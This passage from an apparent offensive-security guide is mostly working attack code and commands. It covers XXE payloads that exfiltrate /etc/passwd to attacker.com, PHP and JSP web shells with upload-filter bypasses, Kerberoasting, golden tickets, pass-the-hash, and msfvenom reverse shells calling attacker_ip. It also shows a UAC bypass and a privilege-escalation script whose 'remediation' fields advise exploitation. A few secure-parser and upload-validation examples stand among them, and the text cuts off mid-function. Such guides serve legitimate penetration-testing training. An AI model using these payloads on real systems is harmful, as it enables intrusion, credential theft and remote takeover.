xxe_payloads = {
    'file_disclosure': '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>''',
    
    'ssrf': '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<root>
  <data>&xxe;</data>
</root>''',
    
    'billion_laughs': '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>''',
    
    'parameter_entities': '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root></root>'''
}

# Secure XML parser
def secure_xml_parser(xml_data):
    """✅ SECURE: Disables external entities"""
    import defusedxml.ElementTree as DefusedET
    
    try:
        root = DefusedET.fromstring(xml_data)
        return DefusedET.tostring(root, encoding='unicode')
    except Exception as e:
        return f"Parsing failed: {e}"

# Alternative secure parsing with lxml
def secure_lxml_parser(xml_data):
    """✅ SECURE: lxml with security features"""
    from lxml import etree
    
    parser = etree.XMLParser(
        resolve_entities=False,  # Disable entity resolution
        no_network=True,  # Disable network access
        dtd_validation=False,  # Disable DTD validation
        load_dtd=False  # Don't load DTD
    )
    
    try:
        root = etree.fromstring(xml_data.encode(), parser)
        return etree.tostring(root, encoding='unicode')
    except Exception as e:
        return f"Parsing failed: {e}"

# XXE Testing
class XXETester:
    """Test for XXE vulnerabilities"""
    
    def __init__(self, target_url):
        self.target = target_url
    
    def test_file_disclosure(self, endpoint):
        """Test for file disclosure via XXE"""
        
        payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><data>&xxe;</data></root>'''
        
        response = requests.post(
            f"{self.target}{endpoint}",
            data=payload,
            headers={'Content-Type': 'application/xml'}
        )
        
        # Check if file contents in response
        if response.status_code == 200 and len(response.text) > 0:
            # Check for typical file patterns
            if any(pattern in response.text for pattern in ['root:', 'localhost', 'ip-']):
                return {
                    'vulnerable': True,
                    'type': 'XXE File Disclosure',
                    'severity': 'HIGH',
                    'evidence': response.text[:200]
                }
    
    def test_oob_xxe(self, endpoint):
        """Test for Out-of-Band XXE"""
        
        # Attacker's server that logs requests
        attacker_server = "http://attacker.com/xxe"
        
        payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{attacker_server}/evil.dtd">
  %dtd;
  %send;
]>
<root></root>'''
        
        # evil.dtd on attacker server:
        # <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/collect?data=%file;'>">
        # %all;
        
        response = requests.post(
            f"{self.target}{endpoint}",
            data=payload,
            headers={'Content-Type': 'application/xml'}
        )
        
        # Check attacker's server logs for incoming request with file contents
```

### File Upload Vulnerabilities

**File Upload Attack Techniques:**

```python
#!/usr/bin/env python3
"""
File Upload Vulnerability Testing and Exploitation
"""

class FileUploadTester:
    """Test file upload security"""
    
    def __init__(self, target_url):
        self.target = target_url
    
    def test_unrestricted_upload(self, upload_endpoint):
        """Test for unrestricted file upload"""
        
        # Web shell payload
        web_shell_php = b'''<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>'''
        
        web_shell_jsp = b'''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
InputStream in = p.getInputStream();
// Output results...
%>'''
        
        test_files = [
            ('shell.php', web_shell_php, 'application/x-php'),
            ('shell.jsp', web_shell_jsp, 'application/x-jsp'),
            ('shell.aspx', b'<% Response.Write("Test") %>', 'application/x-aspx'),
        ]
        
        for filename, content, mime_type in test_files:
            files = {'file': (filename, content, mime_type)}
            
            response = requests.post(
                f"{self.target}{upload_endpoint}",
                files=files
            )
            
            if response.status_code == 200:
                # Check if file is accessible
                # Try to access uploaded file
                pass
    
    def test_extension_bypass(self, upload_endpoint):
        """Test extension filter bypass techniques"""
        
        bypass_techniques = [
            'shell.php.jpg',  # Double extension
            'shell.php%00.jpg',  # Null byte injection
            'shell.php%20',  # Space
            'shell.php.',  # Trailing dot
            'shell.pHP',  # Case variation
            'shell.php5',  # Alternative extension
            'shell.phtml',  # Alternative extension
            '.htaccess',  # Upload .htaccess to execute PHP
        ]
        
        web_shell = b'<?php system($_GET["cmd"]); ?>'
        
        for filename in bypass_techniques:
            files = {'file': (filename, web_shell)}
            
            response = requests.post(
                f"{self.target}{upload_endpoint}",
                files=files
            )
            
            if response.status_code == 200:
                return {
                    'vulnerable': True,
                    'type': 'Extension Filter Bypass',
                    'bypass_filename': filename
                }
    
    def test_mime_type_bypass(self, upload_endpoint):
        """Test MIME type validation bypass"""
        
        # Upload PHP shell with image MIME type
        web_shell = b'GIF89a<?php system($_GET["cmd"]); ?>'
        
        files = {
            'file': ('shell.php', web_shell, 'image/gif')
        }
        
        response = requests.post(
            f"{self.target}{upload_endpoint}",
            files=files
        )
        
        if response.status_code == 200:
            return {
                'vulnerable': True,
                'type': 'MIME Type Validation Bypass'
            }
    
    def test_path_traversal_upload(self, upload_endpoint):
        """Test path traversal in filename"""
        
        traversal_filenames = [
            '../../../shell.php',
            '..\\..\\..\\shell.php',
            '....//....//shell.php',
        ]
        
        for filename in traversal_filenames:
            files = {'file': (filename, b'<?php phpinfo(); ?>')}
            
            response = requests.post(
                f"{self.target}{upload_endpoint}",
                files=files
            )
    
    def create_polyglot_file(self):
        """Create polyglot file (valid image + PHP shell)"""
        
        # Valid JPEG header + PHP code
        polyglot = b'\xff\xd8\xff\xe0\x00\x10JFIF'  # JPEG header
        polyglot += b'\x00' * 100  # Padding
        polyglot += b'\n<?php system($_GET["cmd"]); ?>\n'
        polyglot += b'\xff\xd9'  # JPEG footer
        
        return polyglot

# Secure file upload implementation
class SecureFileUpload:
    """Demonstrates secure file upload practices"""
    
    def __init__(self, upload_dir='/var/uploads'):
        self.upload_dir = upload_dir
        self.max_file_size = 5 * 1024 * 1024  # 5MB
        
        # Whitelist of allowed extensions
        self.allowed_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}
        
        # Whitelist of allowed MIME types
        self.allowed_mime_types = {
            'image/jpeg',
            'image/png',
            'image/gif',
            'application/pdf'
        }
    
    def validate_and_save_file(self, file_data, original_filename):
        """✅ SECURE: Comprehensive file upload validation"""
        
        import os
        import magic
        import hashlib
        from pathlib import Path
        
        # Step 1: Validate file size
        file_size = len(file_data)
        if file_size > self.max_file_size:
            raise ValueError(f"File too large: {file_size} bytes")
        
        if file_size == 0:
            raise ValueError("Empty file not allowed")
        
        # Step 2: Validate filename
        # Remove path components
        filename = os.path.basename(original_filename)
        
        # Check for path traversal
        if '..' in filename or '/' in filename or '\\' in filename:
            raise ValueError("Invalid filename: path traversal detected")
        
        # Check for null bytes
        if '\x00' in filename:
            raise ValueError("Invalid filename: null byte detected")
        
        # Step 3: Validate extension
        extension = Path(filename).suffix.lower()
        if extension not in self.allowed_extensions:
            raise ValueError(f"Extension {extension} not allowed")
        
        # Step 4: Validate MIME type using magic bytes
        mime_type = magic.from_buffer(file_data, mime=True)
        if mime_type not in self.allowed_mime_types:
            raise ValueError(f"MIME type {mime_type} not allowed")
        
        # Step 5: Verify file matches declared type
        if extension == '.jpg' or extension == '.jpeg':
            if mime_type != 'image/jpeg':
                raise ValueError("File extension doesn't match content")
        
        # Step 6: Scan for malicious content
        if self.contains_malicious_content(file_data):
            raise ValueError("Malicious content detected")
        
        # Step 7: Generate secure random filename
        file_hash = hashlib.sha256(file_data).hexdigest()
        secure_filename = f"{file_hash}{extension}"
        
        # Step 8: Save in secure location (outside web root)
        file_path = os.path.join(self.upload_dir, secure_filename)
        
        # Ensure upload directory exists
        os.makedirs(self.upload_dir, exist_ok=True)
        
        # Write file
        with open(file_path, 'wb') as f:
            f.write(file_data)
        
        # Step 9: Set restrictive permissions
        os.chmod(file_path, 0o640)  # rw-r-----
        
        # Step 10: Store metadata in database
        metadata = {
            'original_filename': filename,
            'stored_filename': secure_filename,
            'file_size': file_size,
            'mime_type': mime_type,
            'sha256': file_hash,
            'upload_time': '2024-01-01T00:00:00Z'
        }
        
        return metadata
    
    def contains_malicious_content(self, file_data):
        """Check for malicious patterns in file"""
        
        malicious_patterns = [
            b'<?php',
            b'<%',
            b'<script',
            b'eval(',
            b'exec(',
            b'system(',
            b'shell_exec(',
        ]
        
        # Check first 1KB for malicious patterns
        sample = file_data[:1024]
        
        for pattern in malicious_patterns:
            if pattern in sample.lower():
                return True
        
        return False
    
    def serve_file_securely(self, stored_filename):
        """✅ SECURE: Serve uploaded file safely"""
        
        from flask import send_file
        
        file_path = os.path.join(self.upload_dir, stored_filename)
        
        # Verify file exists and is within upload directory
        if not os.path.exists(file_path):
            raise FileNotFoundError("File not found")
        
        # Prevent path traversal
        if not os.path.abspath(file_path).startswith(os.path.abspath(self.upload_dir)):
            raise ValueError("Path traversal detected")
        
        # Serve with secure headers
        return send_file(
            file_path,
            as_attachment=True,
            download_name=stored_filename,
            mimetype='application/octet-stream'  # Force download
        )
```

## 2.9 Active Directory Attacks

### AD Enumeration with BloodHound

**BloodHound Setup and Usage:**

```bash
#!/bin/bash
# BloodHound Comprehensive Guide

# Installation
echo "[*] Installing BloodHound"

# Install Neo4j (database)
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install neo4j

# Start Neo4j
sudo neo4j console

# Access Neo4j browser: http://localhost:7474
# Default creds: neo4j/neo4j (change on first login)

# Install BloodHound
wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.3.1/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
chmod +x BloodHound-linux-x64/BloodHound

# Data Collection with SharpHound (on Windows target)
# Download SharpHound.exe from BloodHound releases

# PowerShell Collection
echo "[*] Collecting AD data with SharpHound"

# From Windows machine in domain:
powershell -ep bypass

# Import SharpHound
Import-Module .\SharpHound.ps1

# Collect all data
Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName output.zip

# Alternative: Use SharpHound.exe
.\SharpHound.exe -c All -d corp.local --outputdirectory C:\temp

# Collection methods:
# - Group: Group memberships
# - LocalAdmin: Local admin rights
# - Session: Active sessions
# - Trusts: Domain trusts
# - ACL: ACL permissions
# - Container: OU structure
# - GPOLocalGroup: GPO admin rights
# - LoggedOn: Logged on users
# - ObjectProps: Object properties
# - SessionLoop: Multiple session collections
# - All: Everything

# Alternative: From Linux with BloodHound.py
pip3 install bloodhound
bloodhound-python -u user@corp.local -p 'Password123' -ns 10.0.0.1 -d corp.local -c all

# Import data into BloodHound
# 1. Start BloodHound application
./BloodHound-linux-x64/BloodHound

# 2. Login to Neo4j (bolt://localhost:7687)
# 3. Upload zip file (drag & drop)

# Useful BloodHound Queries
echo "[*] Running BloodHound queries"

# Pre-built queries:
# - Find all Domain Admins
# - Find shortest path to Domain Admins
# - Find computers where Domain Users can RDP
# - Find AS-REP Roastable users
# - Find Kerberoastable users
# - Find computers with unconstrained delegation
# - Shortest path from owned principals

# Custom Cypher queries:
# Find users with DCSync rights
MATCH (n:User)-[r:MemberOf|GetChanges*1..]->(d:Domain) RETURN n

# Find computers with admin access
MATCH (c:Computer)-[r:AdminTo]->(t:Computer) RETURN c,r,t

# Find high-value targets
MATCH (n {highvalue:true}) RETURN n

# Find shortest path to DA from compromised user
MATCH p=shortestPath((u:User {name:"COMPROMISED_USER@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
```

**PowerView AD Enumeration:**

```powershell
# PowerView - PowerShell AD Enumeration
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Import PowerView
Import-Module .\PowerView.ps1

# Domain Information
Get-Domain
Get-DomainController
Get-ForestDomain
Get-DomainPolicyData

# User Enumeration
Get-DomainUser
Get-DomainUser -Identity john
Get-DomainUser -Properties samaccountname,description
Get-DomainUser -SPN  # Find service accounts

# Find user properties containing 'password'
Get-DomainUser | Select-Object samaccountname,description | Where-Object {$_.description -like "*password*"}

# Group Enumeration
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"

# Find all groups current user is member of
Get-DomainGroup -UserName john

# Computer Enumeration
Get-DomainComputer
Get-DomainComputer -Properties name,operatingsystem,dnshostname

# Find computers running specific OS
Get-DomainComputer -OperatingSystem "*Server 2019*"

# Share Enumeration
Find-DomainShare
Find-DomainShare -CheckShareAccess  # Only accessible shares

# Find readable shares
Find-InterestingDomainShareFile -Include *.doc,*.xls,*.txt,*.pdf

# Session Enumeration
Get-NetSession -ComputerName DC01
Get-NetLoggedon -ComputerName WEB01

# Find where Domain Admins are logged in
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# ACL Enumeration
Get-ObjectAcl -Identity john
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# GPO Enumeration
Get-DomainGPO
Get-DomainGPO -Identity "Default Domain Policy"
Get-DomainGPOLocalGroup  # GPOs with local admin rights

# Trust Enumeration
Get-DomainTrust
Get-ForestTrust

# Kerberoastable Users
Get-DomainUser -SPN | Select serviceprincipalname,samaccountname

# AS-REP Roastable Users
Get-DomainUser -PreauthNotRequired

# Unconstrained Delegation
Get-DomainComputer -Unconstrained

# Constrained Delegation
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth
```

### Kerberos Attacks

**Kerberoasting:**

```bash
#!/bin/bash
# Kerberoasting Attack

echo "[*] Kerberoasting Attack Workflow"

# Step 1: Find Kerberoastable accounts (accounts with SPNs)
# Using impacket GetUserSPNs.py
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.0.1 -request

# Alternative: Using PowerView
# Get-DomainUser -SPN | Select serviceprincipalname,samaccountname

# Step 2: Request TGS tickets for service accounts
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.0.1 -request -outputfile kerberoast_hashes.txt

# Step 3: Crack the hashes offline
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# hashcat mode 13100 = Kerberos 5 TGS-REP etype 23

# Alternative with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Defense: Set strong passwords for service accounts (25+ characters)
```

**AS-REP Roasting:**

```bash
#!/bin/bash
# AS-REP Roasting Attack

echo "[*] AS-REP Roasting Attack"

# Find users with DONT_REQ_PREAUTH set
GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# If you have credentials:
GetNPUsers.py corp.local/user:password -dc-ip 10.0.0.1 -request

# Crack the hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# hashcat mode 18200 = Kerberos 5 AS-REP etype 23

# Defense: Don't set DONT_REQ_PREAUTH on user accounts
```

**Golden Ticket Attack:**

```python
#!/usr/bin/env python3
"""
Golden Ticket Attack with Mimikatz
"""

# Requirements:
# 1. krbtgt account NTLM hash
# 2. Domain SID
# 3. Domain name

golden_ticket_commands = """
# Get krbtgt hash (requires Domain Admin or DC compromise)
mimikatz # lsadump::lsa /inject /name:krbtgt

# Example output:
# NTLM: a1b2c3d4e5f6...

# Get Domain SID
whoami /user
# Or: Get-ADDomain | Select-Object DomainSID

# Create Golden Ticket
mimikatz # kerberos::golden
    /user:Administrator           # Username (can be any)
    /domain:corp.local            # Domain name
    /sid:S-1-5-21-...             # Domain SID
    /krbtgt:a1b2c3d4e5f6...       # krbtgt NTLM hash
    /id:500                       # RID (500 = Administrator)
    /groups:512,513,518,519,520   # Group memberships
    /ptt                          # Pass the ticket

# Verify ticket
klist

# Access DC
dir \\DC01\C$
psexec.exe \\DC01 cmd
```

**Silver Ticket Attack:**

```bash
# Silver Ticket - For specific service

# Get service account hash
mimikatz # sekurlsa::logonpasswords

# Create Silver Ticket for specific service
mimikatz # kerberos::golden
    /user:Administrator
    /domain:corp.local
    /sid:S-1-5-21-...
    /target:web01.corp.local      # Target computer
    /service:http                 # Service (http, cifs, etc)
    /rc4:service_account_hash
    /ptt

# Access the service
# Silver ticket only works for specified service
```

### Pass-the-Hash Attacks

```bash
#!/bin/bash
# Pass-the-Hash Attack Methods

# Using pth-winexe
pth-winexe -U corp/admin%aad3b435b51404eeaad3b435b51404ee:hash //10.0.0.10 cmd

# Using CrackMapExec
crackmapexec smb 10.0.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:hash

# Execute commands
crackmapexec smb 10.0.0.10 -u admin -H hash -x "whoami"

# Dump SAM
crackmapexec smb 10.0.0.10 -u admin -H hash --sam

# Using Impacket psexec
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:hash corp/admin@10.0.0.10

# Using Impacket wmiexec
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:hash corp/admin@10.0.0.10

# Using Mimikatz
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:hash /run:powershell.exe
```

[Continue with post-exploitation, privilege escalation, and remaining sections...]
## 2.10 Post-Exploitation & Privilege Escalation

Post-exploitation occurs after initial access is gained. The goals are maintaining access, escalating privileges, moving laterally, and achieving objectives.

### Windows Privilege Escalation

**Enumeration Script:**

```powershell
# Windows Privilege Escalation Enumeration
# Save as: enum.ps1

Write-Host "[*] Windows Privilege Escalation Enumeration" -ForegroundColor Green

# System Information
Write-Host "`n[+] System Information" -ForegroundColor Cyan
systeminfo
whoami /all
hostname
net config workstation

# User Enumeration
Write-Host "`n[+] User Enumeration" -ForegroundColor Cyan
net user
net localgroup administrators
whoami /groups
whoami /priv

# Check for interesting privileges
$privileges = whoami /priv | Select-String "SeImpersonate|SeAssignPrimaryToken|SeBackup|SeRestore|SeDebug"
if ($privileges) {
    Write-Host "[!] Interesting privileges found:" -ForegroundColor Red
    Write-Host $privileges
}

# Network Information
Write-Host "`n[+] Network Information" -ForegroundColor Cyan
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh firewall show config

# Password Hunting
Write-Host "`n[+] Searching for Passwords" -ForegroundColor Cyan
# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Files
Get-ChildItem C:\ -Recurse -Include *.txt,*.ini,*.config,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue

# Unattend files
Get-ChildItem C:\Windows\Panther\Unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Windows\System32\sysprep\sysprep.xml -ErrorAction SilentlyContinue

# Credential Manager
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all

# Scheduled Tasks
Write-Host "`n[+] Scheduled Tasks" -ForegroundColor Cyan
schtasks /query /fo LIST /v

# Services
Write-Host "`n[+] Service Information" -ForegroundColor Cyan
# Services running as SYSTEM
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

# Weak service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Unquoted service paths
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -notlike 'C:\Windows\*'} | Select-Object Name, PathName, State

# AlwaysInstallElevated
Write-Host "`n[+] Checking AlwaysInstallElevated" -ForegroundColor Cyan
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Installed Software
Write-Host "`n[+] Installed Software" -ForegroundColor Cyan
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

# Check for vulnerable software
$vulnSoftware = @('Adobe Reader 9', 'VLC 2.2.1', 'FileZilla 3.5.3')
# Check against installed software list

# Running Processes
Write-Host "`n[+] Running Processes" -ForegroundColor Cyan
Get-Process | Select-Object ProcessName, Id, Path | Sort-Object ProcessName

# Autoruns
Write-Host "`n[+] Autorun Programs" -ForegroundColor Cyan
Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Files with Passwords
Write-Host "`n[+] Searching common password locations" -ForegroundColor Cyan
Get-ChildItem -Path C:\Users -Include *password*,*cred*,*vnc*,*.config -Recurse -ErrorAction SilentlyContinue

# SAM and SYSTEM backup
Test-Path C:\Windows\repair\SAM
Test-Path C:\Windows\System32\config\RegBack\SAM

Write-Host "`n[*] Enumeration Complete!" -ForegroundColor Green
```

**Automated Enumeration Tools:**

```bash
#!/bin/bash
# Running Windows privilege escalation tools

# WinPEAS (Windows Privilege Escalation Awesome Scripts)
echo "[*] Running WinPEAS"
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
# On target: winPEASx64.exe

# PowerUp (PowerSploit)
echo "[*] Running PowerUp"
# powershell -ep bypass
# Import-Module .\PowerUp.ps1
# Invoke-AllChecks

# Seatbelt
echo "[*] Running Seatbelt"
# Seatbelt.exe -group=all

# Watson (missing patches)
echo "[*] Running Watson"
# Watson.exe

# SharpUp
echo "[*] Running SharpUp"
# SharpUp.exe
```

**Common Windows Privilege Escalation Techniques:**

```powershell
# Technique 1: Unquoted Service Path
# If service path has spaces and no quotes, can place malicious exe
# Example: C:\Program Files\My Service\service.exe
# Place malicious exe at: C:\Program.exe or C:\Program Files\My.exe

# Find unquoted paths
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -notlike 'C:\Windows\*'} | Select-Object Name, PathName

# Exploit:
# 1. Create malicious executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o Program.exe

# 2. Upload to C:\Program.exe
# 3. Restart service or wait for reboot
sc stop "VulnerableService"
sc start "VulnerableService"

# Technique 2: Weak Service Permissions
# Find services with weak permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# If you can modify service config:
sc config "VulnerableService" binpath= "C:\path\to\malicious.exe"
sc stop "VulnerableService"
sc start "VulnerableService"

# Technique 3: DLL Hijacking
# Check DLL load order for vulnerable application
# Use Process Monitor to identify missing DLLs

# Create malicious DLL
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o hijack.dll

# Place in directory that application checks before system directories

# Technique 4: AlwaysInstallElevated
# Check if enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# If both are 1, create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o evil.msi

# Install
msiexec /quiet /qn /i C:\path\to\evil.msi

# Technique 5: Token Impersonation (SeImpersonatePrivilege)
# Check privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled
# Use Juicy Potato, Rogue Potato, or PrintSpoofer

# JuicyPotato
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\path\to\reverse.exe" -t *

# PrintSpoofer
PrintSpoofer.exe -i -c cmd

# Technique 6: Stored Credentials
# Look for credentials in common locations

# Credential Manager
cmdkey /list
# Use saved credentials
runas /savecred /user:ADMIN cmd.exe

# Windows Vault
vaultcmd /list
vaultcmd /listproperties:"Windows Credentials"
vaultcmd /listcreds:"Windows Credentials"

# Registry passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Technique 7: Kernel Exploits
# Identify missing patches
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Use Watson to identify missing patches
Watson.exe

# Common kernel exploits:
# - MS16-032: Secondary Logon Handle
# - MS16-135: Win32k Privilege Escalation
# - MS17-017: GDI Palette Objects

# Technique 8: Pass-the-Hash/Pass-the-Ticket
# If you have NTLM hash or Kerberos ticket

# Using Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:hash_here /run:cmd.exe

# Technique 9: Misconfigured Services - Modifiable Binaries
# Find services running binaries you can modify
Get-WmiObject win32_service | Select-Object Name, State, PathName

# If binary is writable, replace with malicious one
# Check permissions
icacls "C:\Program Files\Service\service.exe"

# Replace binary
copy malicious.exe "C:\Program Files\Service\service.exe"
sc stop "VulnerableService"
sc start "VulnerableService"

# Technique 10: UAC Bypass
# Various UAC bypass techniques

# Fodhelper bypass (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\path\to\malicious.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

**Automated Privilege Escalation:**

```python
#!/usr/bin/env python3
"""
Windows Privilege Escalation Automation
"""
import subprocess
import os
import re

class WindowsPrivEsc:
    """Automate Windows privilege escalation checks"""
    
    def __init__(self):
        self.findings = []
    
    def check_unquoted_service_paths(self):
        """Find services with unquoted paths"""
        
        cmd = 'wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """'
        
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            
            if result.stdout:
                self.findings.append({
                    'type': 'Unquoted Service Path',
                    'severity': 'MEDIUM',
                    'details': result.stdout,
                    'remediation': 'Add quotes around service path'
                })
                
        except Exception as e:
            pass
    
    def check_always_install_elevated(self):
        """Check if AlwaysInstallElevated is set"""
        
        keys = [
            r'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer',
            r'HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer'
        ]
        
        elevated = []
        
        for key in keys:
            cmd = f'reg query "{key}" /v AlwaysInstallElevated'
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            
            if 'AlwaysInstallElevated' in result.stdout and '0x1' in result.stdout:
                elevated.append(key)
        
        if len(elevated) == 2:
            self.findings.append({
                'type': 'AlwaysInstallElevated Enabled',
                'severity': 'HIGH',
                'details': 'Both HKLM and HKCU keys are set',
                'remediation': 'Create malicious MSI and install'
            })
    
    def check_privileges(self):
        """Check current privileges"""
        
        cmd = 'whoami /priv'
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )
        
        dangerous_privs = [
            'SeImpersonatePrivilege',
            'SeAssignPrimaryTokenPrivilege',
            'SeBackupPrivilege',
            'SeRestorePrivilege',
            'SeDebugPrivilege',
            'SeTakeOwnershipPrivilege'
        ]
        
        for priv in dangerous_privs:
            if priv in result.stdout and 'Enabled' in result.stdout:
                self.findings.append({
                    'type': 'Dangerous Privilege Enabled',
                    'severity': 'HIGH',
                    'privilege': priv,
                    'remediation': f'Use {priv} for privilege escalation'
                })
    
    def check_weak_service_permissions(self):
        """Check for services with weak permissions"""
        
        # This requires accesschk.exe from Sysinternals
        if not os.path.exists('accesschk.exe'):
            return
        
        cmd = 'accesschk.exe -uwcqv "Everyone" * /accepteula'
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )
        
        if 'SERVICE_ALL_ACCESS' in result.stdout or 'SERVICE_CHANGE_CONFIG' in result.stdout:
            self.findings.append({
                'type': 'Weak Service Permissions',
                'severity': 'HIGH',
                'details': result.stdout,
                'remediation': 'Modify service configuration'
            })
    
    def check_stored_credentials(self):
        """Check for stored credentials"""
        
        # Credential Manager
        cmd = 'cmdkey /list'
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )
        
        if 'Target:' in result.stdout:
            self.findings.append({
                'type': 'Stored Credentials Found',
                'severity': 'MEDIUM',
                'details': result.stdout,
                'remediation': 'Use with runas /savecred'
            })
    
    def generate_report(self):
        """Generate HTML report"""
        
        report = """
        <html>
        <head>
            <title>Windows Privilege Escalation Report</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                .finding { border: 1px solid #ccc; padding: 10px; margin: 10px 0; }
                .high { border-left: 5px solid red; }
                .medium { border-left: 5px solid orange; }
                .low { border-left: 5px solid yellow; }
            </style>
        </head>
        <body>
            <h1>Windows Privilege Escalation Report</h1>
        """
        
        for finding in self.findings:
            severity_class = finding['severity'].lower()
            report += f"""
            <div class="finding {severity_class}">
                <h3>{finding['type']} - {finding['severity']}</h3>
                <p><strong>Details:</strong> {finding.get('details', 'N/A')}</p>
